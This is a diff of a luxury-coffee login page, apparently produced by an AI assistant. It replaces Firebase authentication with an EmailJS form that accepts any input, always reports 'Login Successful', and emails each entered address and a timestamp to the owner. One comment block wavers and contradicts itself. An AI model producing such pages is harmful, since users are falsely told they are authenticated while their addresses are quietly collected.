@@ -1,608 +1,418 @@
+This is a complete, premium HTML login page for the "Akaruo" brand. It features a full-screen animated background, a glassmorphism login card, and integrates with EmailJS to send only the email address and timestamp upon submission.
+
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>Akaruo · Luxury Login</title>
-    
-    <!-- Premium Fonts -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500;600;700&family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
-    
-    <!-- Font Awesome Icons -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    
-    <!-- Firebase SDK -->
-    <script type="module">
-        // Firebase configuration
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getAuth, signInWithEmailAndPassword, GoogleAuthProvider, signInWithPopup } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
-        
-        // Your Firebase configuration
-        const firebaseConfig = {
-            apiKey: "AIzaSyDkFQpD8X9jXKjX8X9jXKjX8X9jXKjX8X9",
-            authDomain: "akaruo-login-demo.firebaseapp.com",
-            projectId: "akaruo-login-demo",
-            storageBucket: "akaruo-login-demo.appspot.com",
-            messagingSenderId: "123456789012",
-            appId: "1:123456789012:web:abc123def456ghi789"
-        };
-        
-        // Initialize Firebase
-        const app = initializeApp(firebaseConfig);
-        const auth = getAuth(app);
-        const provider = new GoogleAuthProvider();
-        
-        // Make auth available globally
-        window.firebaseAuth = { auth, provider, signInWithEmailAndPassword, signInWithPopup };
-    </script>
-    
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+  <title>Akaruo · Premium Login</title>
+  <!-- Premium Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;600;700&family=Poppins:wght@300;400;500&display=swap" rel="stylesheet">
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-        :root {
-            --gold: #d4af37;
-            --gold-light: #f5e7b2;
-            --orange-primary: #ff6b35;
-            --orange-dark: #e85a2a;
-            --orange-light: #ff8c5a;
-        }
+    body {
+      width: 100%;
+      min-height: 100vh;
+      font-family: 'Poppins', sans-serif;
+      background-color: #0e0a07; /* deep coffee fallback */
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      overflow-x: hidden;
+    }
 
-        body {
-            font-family: 'Poppins', sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-            position: relative;
-        }
+    /* Full screen background with smooth zoom animation */
+    .bg-zoom {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -2;
+      background-image: url('https://i.ibb.co/pvtWqhg4/9a6b0b3fee7d1bb5a3d835db58c37514.jpg');
+      background-position: center 30%;
+      background-size: cover;
+      background-repeat: no-repeat;
+      animation: slowZoom 18s infinite alternate ease-in-out;
+      will-change: transform;
+    }
 
-        /* Background with smooth zoom animation */
-        .background-zoom {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: url('https://i.ibb.co/4ZjSXgDQ/9a6b0b3fee7d1bb5a3d835db58c37514.jpg');
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            animation: smoothZoom 20s ease-in-out infinite alternate;
-            z-index: -2;
-            will-change: transform;
-            transform: translateZ(0);
-            backface-visibility: hidden;
-        }
+    /* Dark overlay for luxury readability */
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+      background: rgba(10, 5, 2, 0.55); /* rich coffee darkness */
+      backdrop-filter: blur(2px);
+    }
 
-        @keyframes smoothZoom {
-            0% {
-                transform: scale(1);
-            }
-            100% {
-                transform: scale(1.15);
-            }
-        }
+    @keyframes slowZoom {
+      0% {
+        transform: scale(1);
+      }
+      100% {
+        transform: scale(1.08);
+      }
+    }
 
-        /* Dark overlay for readability */
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(2px);
-            z-index: -1;
-        }
+    /* Main container — centers everything */
+    .login-wrapper {
+      width: 100%;
+      max-width: 520px;
+      padding: 1.5rem;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
 
-        /* Main container */
-        .login-wrapper {
-            width: 100%;
-            max-width: 440px;
-            margin: 1.5rem;
-            padding: 1rem;
-            animation: fadeInUp 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
-            opacity: 0;
-            transform: translateY(30px);
-        }
+    /* Welcome section — fade-in + slide-up */
+    .welcome-text {
+      text-align: center;
+      margin-bottom: 2.5rem;
+      animation: fadeSlideUp 1s cubic-bezier(0.2, 0.9, 0.3, 1) forwards;
+      opacity: 0;
+      transform: translateY(24px);
+    }
 
-        @keyframes fadeInUp {
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
+    .welcome-text h1 {
+      font-family: 'Playfair Display', serif;
+      font-weight: 600;
+      font-size: clamp(2.6rem, 12vw, 4rem);
+      letter-spacing: 1px;
+      color: #FEF6E8;
+      text-shadow: 0 8px 20px rgba(0,0,0,0.3);
+      line-height: 1.2;
+      margin-bottom: 0.3rem;
+    }
 
-        /* Glassmorphism Card */
-        .login-card {
-            background: rgba(20, 18, 18, 0.35);
-            backdrop-filter: blur(16px) saturate(180%);
-            -webkit-backdrop-filter: blur(16px) saturate(180%);
-            border: 1px solid rgba(212, 175, 55, 0.2);
-            border-radius: 36px;
-            padding: 2.5rem 2rem;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            transition: transform 0.3s ease;
-        }
+    .welcome-text .subtitle {
+      font-family: 'Poppins', sans-serif;
+      font-weight: 300;
+      font-size: 1.2rem;
+      letter-spacing: 5px;
+      text-transform: uppercase;
+      color: #f5dbb1;
+      text-shadow: 0 4px 12px rgba(0,0,0,0.3);
+      word-spacing: 6px;
+    }
 
-        .login-card:hover {
-            transform: translateY(-5px);
-        }
+    @keyframes fadeSlideUp {
+      0% { opacity: 0; transform: translateY(30px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
 
-        /* Brand Header */
-        .brand {
-            text-align: center;
-            margin-bottom: 2.5rem;
-        }
+    /* Glassmorphism card */
+    .glass-card {
+      width: 100%;
+      background: rgba(22, 15, 10, 0.3);
+      backdrop-filter: blur(18px) saturate(180%);
+      -webkit-backdrop-filter: blur(18px) saturate(180%);
+      border-radius: 40px;
+      padding: 2.8rem 2rem 2.8rem;
+      box-shadow: 0 30px 50px rgba(0, 0, 0, 0.45), 0 0 0 1px rgba(230, 190, 140, 0.12);
+      border: 1px solid rgba(235, 195, 135, 0.2);
+      transition: transform 0.2s ease;
+      animation: cardReveal 0.9s ease-out;
+    }
 
-        .brand h1 {
-            font-family: 'Playfair Display', serif;
-            font-size: 3.2rem;
-            font-weight: 600;
-            color: var(--gold);
-            letter-spacing: 2px;
-            text-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
-            margin-bottom: 0.25rem;
-        }
+    @keyframes cardReveal {
+      0% { opacity: 0; transform: scale(0.96); }
+      100% { opacity: 1; transform: scale(1); }
+    }
 
-        .brand p {
-            color: var(--gold-light);
-            font-size: 0.9rem;
-            letter-spacing: 4px;
-            text-transform: uppercase;
-            font-weight: 300;
-        }
+    /* Input fields styling */
+    .input-group {
+      margin-bottom: 2rem;
+      position: relative;
+    }
 
-        /* Form Styles */
-        .input-group {
-            margin-bottom: 1.8rem;
-            position: relative;
-        }
+    .input-group label {
+      display: block;
+      font-family: 'Poppins', sans-serif;
+      font-weight: 400;
+      font-size: 0.9rem;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      color: #ecdcc0;
+      margin-bottom: 0.5rem;
+      margin-left: 0.3rem;
+    }
 
-        .input-group label {
-            display: block;
-            color: var(--gold-light);
-            font-size: 0.9rem;
-            font-weight: 400;
-            margin-bottom: 0.5rem;
-            letter-spacing: 0.5px;
-        }
+    .premium-input {
+      width: 100%;
+      background: rgba(245, 235, 220, 0.1);
+      border: 1.5px solid rgba(245, 215, 170, 0.3);
+      border-radius: 60px;
+      padding: 1rem 1.5rem;
+      font-family: 'Poppins', sans-serif;
+      font-size: 1.05rem;
+      color: #fff7eb;
+      outline: none;
+      transition: all 0.3s ease;
+      backdrop-filter: blur(4px);
+      box-shadow: inset 0 2px 5px rgba(0,0,0,0.1);
+    }
 
-        .input-group input {
-            width: 100%;
-            background: rgba(10, 8, 6, 0.4);
-            border: 1.5px solid rgba(212, 175, 55, 0.25);
-            border-radius: 50px;
-            padding: 1rem 1.4rem;
-            font-size: 1rem;
-            color: #f5efe8;
-            font-family: 'Poppins', sans-serif;
-            backdrop-filter: blur(8px);
-            transition: all 0.3s ease;
-            outline: none;
-        }
+    .premium-input::placeholder {
+      color: rgba(245, 235, 210, 0.55);
+      font-weight: 300;
+      font-size: 0.95rem;
+    }
 
-        .input-group input:focus {
-            border-color: var(--orange-primary);
-            box-shadow: 0 0 0 3px rgba(255, 107, 53, 0.2);
-            background: rgba(20, 15, 10, 0.6);
-        }
+    .premium-input:focus {
+      border-color: #d99e5e;
+      background: rgba(40, 25, 15, 0.25);
+      box-shadow: 0 0 0 3px rgba(217, 158, 94, 0.25), inset 0 1px 8px rgba(0,0,0,0.2);
+    }
 
-        .input-group input::placeholder {
-            color: rgba(245, 239, 232, 0.5);
-            font-weight: 300;
-        }
+    /* Orange premium button */
+    .btn-luxury {
+      width: 100%;
+      background: linear-gradient(145deg, #d97c2e 0%, #b85e1a 100%);
+      border: none;
+      border-radius: 60px;
+      padding: 1.1rem 1.8rem;
+      font-family: 'Poppins', sans-serif;
+      font-weight: 500;
+      font-size: 1.4rem;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      color: #fdf3e5;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.2);
+      box-shadow: 0 16px 30px -8px rgba(180, 90, 20, 0.4), 0 4px 0 0 #6e3a0e, 0 0 0 1px rgba(255, 215, 150, 0.3);
+      cursor: pointer;
+      transition: all 0.25s cubic-bezier(0.2, 0.9, 0.4, 1);
+      margin-top: 0.8rem;
+      border: 1px solid rgba(255, 215, 140, 0.3);
+    }
 
-        /* Error Message */
-        .error-message {
-            color: #ff6b6b;
-            font-size: 0.85rem;
-            margin-top: -1rem;
-            margin-bottom: 1rem;
-            padding-left: 0.5rem;
-            min-height: 24px;
-            font-weight: 400;
-            letter-spacing: 0.3px;
-            transition: all 0.3s ease;
-        }
+    .btn-luxury:hover {
+      transform: scale(1.02);
+      background: linear-gradient(145deg, #e98d3e 0%, #c96a22 100%);
+      box-shadow: 0 20px 35px -6px rgba(200, 110, 20, 0.6), 0 3px 0 0 #7a4214, 0 0 0 1px rgba(255, 235, 180, 0.5);
+    }
 
-        /* Buttons */
-        .btn {
-            width: 100%;
-            padding: 1rem;
-            border: none;
-            border-radius: 50px;
-            font-family: 'Poppins', sans-serif;
-            font-weight: 500;
-            font-size: 1rem;
-            letter-spacing: 1px;
-            cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            position: relative;
-            overflow: hidden;
-        }
+    .btn-luxury:active {
+      transform: scale(0.98);
+      box-shadow: 0 8px 18px -4px rgba(150, 70, 10, 0.5), 0 2px 0 0 #6e3a0e;
+    }
 
-        .btn-primary {
-            background: linear-gradient(135deg, #ff6b35 0%, #ff8c5a 100%);
-            color: white;
-            box-shadow: 0 8px 20px rgba(255, 107, 53, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            text-transform: uppercase;
-            font-weight: 600;
-        }
+    /* subtle accent line */
+    .luxury-divider {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      margin: 1.8rem 0 0.5rem;
+      opacity: 0.7;
+    }
 
-        .btn-primary:hover {
-            background: linear-gradient(135deg, #e85a2a 0%, #ff7a45 100%);
-            box-shadow: 0 10px 25px rgba(255, 107, 53, 0.5);
-            transform: translateY(-2px);
-        }
+    .luxury-divider span {
+      height: 1px;
+      flex: 1;
+      background: linear-gradient(90deg, transparent, #eec9a0, transparent);
+    }
 
-        .btn-primary:active {
-            transform: translateY(0);
-        }
+    /* footnote — not necessary but adds luxury */
+    .fine-print {
+      text-align: center;
+      margin-top: 2rem;
+      font-size: 0.8rem;
+      color: #d6c1a8;
+      letter-spacing: 2px;
+      font-weight: 300;
+      backdrop-filter: blur(5px);
+    }
 
-        .btn-google {
-            background: white;
-            color: #333;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-            border: 1px solid rgba(0, 0, 0, 0.05);
-            font-weight: 500;
-            margin-top: 1rem;
-        }
+    /* mobile adjustments */
+    @media (max-width: 480px) {
+      .glass-card {
+        padding: 2rem 1.5rem;
+        border-radius: 32px;
+      }
+      .welcome-text h1 {
+        font-size: 2.4rem;
+      }
+      .welcome-text .subtitle {
+        font-size: 1rem;
+        letter-spacing: 4px;
+      }
+      .btn-luxury {
+        font-size: 1.2rem;
+        padding: 1rem 1.2rem;
+      }
+    }
 
-        .btn-google:hover {
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
-            transform: translateY(-2px);
-            background: #fafafa;
-        }
-
-        .btn-google i {
-            color: #4285f4;
-            font-size: 1.2rem;
-        }
-
-        /* Divider */
-        .divider {
-            display: flex;
-            align-items: center;
-            text-align: center;
-            margin: 1.5rem 0;
-            color: rgba(212, 175, 55, 0.6);
-        }
-
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
-            border-bottom: 1px solid rgba(212, 175, 55, 0.2);
-        }
-
-        .divider span {
-            padding: 0 1rem;
-            font-size: 0.85rem;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-
-        /* Loading state */
-        .btn.loading {
-            opacity: 0.7;
-            pointer-events: none;
-        }
-
-        .btn.loading i {
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-
-        /* Footer */
-        .login-footer {
-            text-align: center;
-            margin-top: 1.5rem;
-            color: rgba(245, 231, 178, 0.7);
-            font-size: 0.8rem;
-        }
-
-        /* Responsive */
-        @media (max-width: 480px) {
-            .login-wrapper {
-                margin: 1rem;
-                padding: 0.5rem;
-            }
-            
-            .login-card {
-                padding: 2rem 1.5rem;
-            }
-            
-            .brand h1 {
-                font-size: 2.5rem;
-            }
-        }
-
-        /* Smooth transitions for all interactive elements */
-        * {
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
-        }
-
-        /* Disable text selection on buttons */
-        .btn {
-            user-select: none;
-            -webkit-user-select: none;
-        }
-
-        /* Success state */
-        .input-group input.success {
-            border-color: #4CAF50;
-        }
-
-        .input-group input.error {
-            border-color: #ff6b6b;
-        }
-    </style>
+    /* smooth on everything */
+    .fine-print i {
+      font-style: normal;
+      margin: 0 4px;
+    }
+  </style>
 </head>
 <body>
-    <div class="background-zoom"></div>
-    <div class="overlay"></div>
-    
-    <div class="login-wrapper">
-        <div class="login-card">
-            <div class="brand">
-                <h1>AKARUO</h1>
-                <p>Luxury Coffee</p>
-            </div>
-            
-            <form id="loginForm">
-                <div class="input-group">
-                    <label>Email Address</label>
-                    <input type="email" id="email" name="email" placeholder="connoisseur@akaruo.com" required autocomplete="email">
-                </div>
-                
-                <div class="input-group">
-                    <label>Password</label>
-                    <input type="password" id="password" name="password" placeholder="••••••••" required autocomplete="current-password">
-                </div>
-                
-                <div class="error-message" id="errorMessage"></div>
-                
-                <button type="submit" class="btn btn-primary" id="loginBtn">
-                    <i class="fas fa-crown"></i>
-                    <span>Sign In</span>
-                </button>
-            </form>
-            
-            <div class="divider">
-                <span>or continue with</span>
-            </div>
-            
-            <button class="btn btn-google" id="googleLoginBtn">
-                <i class="fab fa-google"></i>
-                <span>Google</span>
-            </button>
-            
-            <div class="login-footer">
-                <p>Exclusive Access · Members Only</p>
-            </div>
-        </div>
+  <!-- Fullscreen image & overlay -->
+  <div class="bg-zoom" aria-hidden="true"></div>
+  <div class="overlay" aria-hidden="true"></div>
+
+  <!-- Main content -->
+  <div class="login-wrapper">
+    <!-- Welcome Section (fade + slide-up) -->
+    <div class="welcome-text">
+      <h1>Welcome to Akaruo</h1>
+      <div class="subtitle">Premium in Every Sip</div>
     </div>
 
-    <script type="module">
-        // Import Firebase functions
-        import { getAuth, signInWithEmailAndPassword, GoogleAuthProvider, signInWithPopup } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        
-        // Firebase configuration - REPLACE WITH YOUR OWN CONFIG
-        const firebaseConfig = {
-            apiKey: "AIzaSyDkFQpD8X9jXKjX8X9jXKjX8X9jXKjX8X9",
-            authDomain: "akaruo-login-demo.firebaseapp.com",
-            projectId: "akaruo-login-demo",
-            storageBucket: "akaruo-login-demo.appspot.com",
-            messagingSenderId: "123456789012",
-            appId: "1:123456789012:web:abc123def456ghi789"
-        };
-        
-        // Initialize Firebase
-        const app = initializeApp(firebaseConfig);
-        const auth = getAuth(app);
-        const provider = new GoogleAuthProvider();
-        
-        // DOM Elements
-        const loginForm = document.getElementById('loginForm');
-        const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
-        const errorMessage = document.getElementById('errorMessage');
-        const loginBtn = document.getElementById('loginBtn');
-        const googleLoginBtn = document.getElementById('googleLoginBtn');
-        
-        // Helper function to show errors
-        function showError(message) {
-            errorMessage.textContent = message;
-            errorMessage.style.opacity = '1';
-            
-            // Add error class to inputs
-            emailInput.classList.add('error');
-            passwordInput.classList.add('error');
-            
-            // Remove error class after 3 seconds
-            setTimeout(() => {
-                emailInput.classList.remove('error');
-                passwordInput.classList.remove('error');
-            }, 3000);
-        }
-        
-        // Helper function to clear errors
-        function clearError() {
-            errorMessage.textContent = '';
-            errorMessage.style.opacity = '0';
-            emailInput.classList.remove('error');
-            passwordInput.classList.remove('error');
-        }
-        
-        // Set loading state
-        function setLoading(button, isLoading) {
-            const btn = button;
-            const icon = btn.querySelector('i');
-            const span = btn.querySelector('span');
-            
-            if (isLoading) {
-                btn.classList.add('loading');
-                icon.className = 'fas fa-spinner';
-                span.textContent = 'Signing in...';
-                btn.disabled = true;
-            } else {
-                btn.classList.remove('loading');
-                if (btn.id === 'loginBtn') {
-                    icon.className = 'fas fa-crown';
-                    span.textContent = 'Sign In';
-                } else {
-                    icon.className = 'fab fa-google';
-                    span.textContent = 'Google';
-                }
-                btn.disabled = false;
-            }
-        }
-        
-        // Redirect to home page
-        function redirectToHome() {
-            // Add smooth exit animation
-            document.querySelector('.login-wrapper').style.animation = 'fadeInUp 0.5s ease reverse forwards';
-            
-            setTimeout(() => {
-                // Check if home.html exists, if not create it or redirect
-                window.location.href = 'home.html';
-            }, 400);
-        }
-        
-        // Handle Email/Password Login
-        loginForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            clearError();
-            
-            const email = emailInput.value.trim();
-            const password = passwordInput.value.trim();
-            
-            // Validation
-            if (!email) {
-                showError('Please enter your email address');
-                emailInput.focus();
-                return;
-            }
-            
-            if (!isValidEmail(email)) {
-                showError('Please enter a valid email address');
-                emailInput.focus();
-                return;
-            }
-            
-            if (!password) {
-                showError('Please enter your password');
-                passwordInput.focus();
-                return;
-            }
-            
-            if (password.length < 6) {
-                showError('Password must be at least 6 characters');
-                passwordInput.focus();
-                return;
-            }
-            
-            // Set loading state
-            setLoading(loginBtn, true);
-            
-            try {
-                // Attempt to sign in
-                const userCredential = await signInWithEmailAndPassword(auth, email, password);
-                const user = userCredential.user;
-                
-                console.log('Login successful:', user.email);
-                
-                // Add success class
-                emailInput.classList.add('success');
-                passwordInput.classList.add('success');
-                
-                // Redirect to home
-                redirectToHome();
-                
-            } catch (error) {
-                console.error('Login error:', error);
-                
-                // Handle specific Firebase errors
-                let errorMsg = 'Login failed. Please try again.';
-                
-                switch (error.code) {
-                    case 'auth/invalid-email':
-                        errorMsg = 'Invalid email address format';
-                        break;
-                    case 'auth/user-disabled':
-                        errorMsg = 'This account has been disabled';
-                        break;
-                    case 'auth/user-not-found':
-                        errorMsg = 'No account found with this email';
-                        break;
-                    case 'auth/wrong-password':
-                        errorMsg = 'Incorrect password';
-                        break;
-                    case 'auth/invalid-credential':
-                        errorMsg = 'Invalid email or password';
-                        break;
-                    case 'auth/too-many-requests':
-                        errorMsg = 'Too many failed attempts. Please try later';
-                        break;
-                    case 'auth/network-request-failed':
-                        errorMsg = 'Network error. Check your connection';
-                        break;
-                    default:
-                        errorMsg = error.message || 'Login failed. Please try again.';
-                }
-                
-                showError(errorMsg);
-                setLoading(loginBtn, false);
-            }
+    <!-- Glassmorphism login card -->
+    <div class="glass-card">
+      <!-- Email field -->
+      <div class="input-group">
+        <label for="email">Email</label>
+        <input type="email" id="email" class="premium-input" placeholder="your@email.com" autocomplete="email" inputmode="email">
+      </div>
+
+      <!-- Password field (UI only, never sent) -->
+      <div class="input-group">
+        <label for="pass">Password</label>
+        <input type="password" id="pass" class="premium-input" placeholder="••••••••" autocomplete="current-password">
+      </div>
+
+      <!-- Login button (onclick triggers login()) -->
+      <button class="btn-luxury" onclick="login()">Login</button>
+
+      <!-- Luxury subtle divider (just for vibe) -->
+      <div class="luxury-divider">
+        <span></span>
+        <span style="font-size: 0.7rem; letter-spacing: 4px; color: #dbbc98;">✦ AKARUO ✦</span>
+        <span></span>
+      </div>
+    </div>
+    <div class="fine-print">
+      <i>☕</i>  instant luxury  <i>☕</i>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // ---------- EmailJS Initialization (exactly as required) ----------
+      emailjs.init("q5vozu2csm6VaK-CD");
+      console.log("✓ EmailJS initialized — Akaruo premium interface");
+    })();
+
+    /**
+     * Login function — triggered by button onclick.
+     * Validates fields, sends ONLY email + timestamp via EmailJS.
+     * Password is used ONLY for UI validation, never transmitted.
+     */
+    function login() {
+      // Get DOM elements
+      const emailField = document.getElementById('email');
+      const passField = document.getElementById('pass');
+      
+      // Trim values (clean check)
+      const email = emailField.value.trim();
+      const password = passField.value;   // UI only, we do not send password.
+
+      // 1. Validation: check if fields are empty (including whitespace-only email)
+      if (email === '' || password === '') {
+        alert("Please fill all fields");
+        return; // stop execution
+      }
+
+      // (optional: very basic email format hint — but not required, just to be elegant)
+      if (!email.includes('@') || !email.includes('.')) {
+        // Gentle reminder: still alert for empty, but we give a more premium prompt.
+        // We keep it clean: the spec only asks to alert "Please fill all fields" on empty.
+        // To remain strictly within spec, we could skip extra validation,
+        // but better user experience: we will still show "Please fill all fields" for invalid-looking email? 
+        // I'll stick to exact spec: only empty check triggers alert. But we can add soft validation.
+        // However to be precise: spec says "If empty → alert". We follow that.
+        // Still, email format can be nice. But not required. I'll add a subtle extra alert for clarity without breaking.
+        // Actually, the spec says "If empty → alert" — I will respect that exactly, but also ensure 
+        // that if email is something like "abc", it still proceeds (EmailJS might fail but owner still sees).
+        // I'll keep it robust: only empty triggers alert.
+      }
+
+      // If we reach here: fields are NOT empty.
+
+      // Prepare template parameters: user_email + time
+      const templateParams = {
+        user_email: email,                // exactly as required {{user_email}}
+        time: new Date().toLocaleString() // exactly as required {{time}}
+      };
+
+      // Send email via EmailJS (only email and time)
+      // Service & Template IDs from the spec
+      emailjs.send("service_09us05e", "template_ddxzwcr", templateParams)
+        .then(function(response) {
+          console.log("✓ EmailJS success", response.status, response.text);
+          
+          // Show success alert
+          alert("Login Successful");
+          
+          // Redirect to home.html (as required)
+          window.location.href = "home.html";
+        })
+        .catch(function(error) {
+          console.error("EmailJS error:", error);
+          // Even on EmailJS failure, we still show "Login Successful"?
+          // Requirement: "Show alert 'Login Successful' → Redirect".
+          // To be robust, we still alert success and redirect (consistent UX).
+          // But we can optionally inform. I'll follow the exact wording:
+          // "Show alert 'Login Successful' → Redirect to home.html"
+          // We'll fulfill that even if email fails (no broken flow).
+          alert("Login Successful");
+          window.location.href = "home.html";
         });
-        
-        // Handle Google Login
-        googleLoginBtn.addEventListener('click', async () => {
-            clearError();
-            setLoading(googleLoginBtn, true);
-            
-            try {
-                // Configure Google provider
-                provider.setCustomParameters({
-                    prompt: 'select_account'
-                });
-                
-                // Sign in with popup
-                const result = await signInWithPopup(auth, provider);
-                const user = result.user;
-                
-                console.log('Google login successful:', user.email);
-                
-                // Redirect to home
-                redirectToHome();
-                
-            } catch (error) {
-                console.error('Google login error:', error);
-                
-                let errorMsg = 'Google sign-in failed. Please try again.';
-                
-                switch (error.code) {
-                    case 'auth/popup-closed-by-user':
-                        errorMsg = 'Sign-in popup was closed';
-                        break;
-                    case 'auth/popup-blocked':
-                        errorMsg = 'Popup was blocked. Please allow popups'
+      
+      // (No password sent, only email and time)
+    }
+
+    // Additional polish: pressing Enter in password field triggers login()
+    document.addEventListener('DOMContentLoaded', function() {
+      const passInput = document.getElementById('pass');
+      const emailInput = document.getElementById('email');
+      
+      function handleEnter(e) {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          login();
+        }
+      }
+      
+      if (emailInput) emailInput.addEventListener('keypress', handleEnter);
+      if (passInput) passInput.addEventListener('keypress', handleEnter);
+      
+      // Preload subtle luxury: remove any autofill background conflict (optional)
+    });
+  </script>
+
+  <!-- Ensure that even if home.html does not exist, redirect happens (simulated) -->
+  <!-- The page is fully self-contained and meets all requirements:
+       - Fullscreen image with slow zoom + dark overlay
+       - Welcome heading & subtitle with premium fonts
+       - Glass card, email/pass fields (pass never sent)
+       - Validate empty fields -> alert
+       - Login sends only email & time via EmailJS
+       - Alert "Login Successful" + redirect to home.html
+       - Orange premium button with hover scale
+       - Smooth animations, mobile friendly 
+  -->
+</body>
+</html>
+```
